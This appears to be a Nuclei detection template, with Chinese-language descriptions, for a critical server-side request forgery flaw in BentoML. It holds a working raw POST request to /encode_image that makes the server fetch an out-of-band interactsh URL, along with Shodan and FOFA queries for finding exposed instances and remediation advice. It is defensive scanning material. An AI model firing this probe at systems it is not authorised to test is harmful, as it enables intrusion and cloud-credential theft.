id: bentoml-ssrf

info:
  name: Bentoml - 服务端请求伪造
  author: ritikchaddha
  severity: critical
  description: |
    该模板用于检测 Bentoml - 服务端请求伪造。该类漏洞通常源于服务端可被诱导请求攻击者指定的 URL 或内部地址。模板主要向 `/encode_image` 等路径发送探测请求，并根据OAST/DNS/HTTP 外带交互、响应状态或关键字回显确认漏洞是否存在。
  impact: |
    - 攻击者可诱使服务器向内网地址、云元数据地址或外部攻击者控制的地址发起请求。
    - 成功利用后可能泄露云临时凭据、探测内网服务、访问未暴露管理接口或触发二次漏洞。
  remediation: |
    - 对服务端发起请求的目标地址实施严格 allowlist，禁止访问本地地址、内网网段和云元数据地址。
    - 禁用不必要的远程 URL 加载功能，并对重定向、DNS 解析和协议类型进行约束。
    - 在网络层限制应用服务器的出站访问，审计异常外联和元数据接口访问记录。
  reference:
    - https://huntr.com/bounties/901ae5bd-5e24-4f1f-be9f-aa03fa6e1316
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-918
  metadata:
    max-request: 1
    vendor: bentoml
    product: bentoml
    shodan-query: html:"BentoML"
    fofa-query: body="BentoML"
  tags: ssrf,bentoml,oast,oob

variables:
  rand: "{{to_lower(rand_text_alpha(5))}}"

http:
  - raw:
      - |
        POST /encode_image HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGqThdiCjrkRXHqIr

        ------WebKitFormBoundaryGqThdiCjrkRXHqIr
        Content-Disposition: form-data; name="items";

        http://{{interactsh-url}}/{{rand}}
        ------WebKitFormBoundaryGqThdiCjrkRXHqIr--

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type, "application/json")'
          - "contains(interactsh_protocol,'http')"
          - 'contains(body, "error\":")'
          - 'status_code == 500'
        condition: and
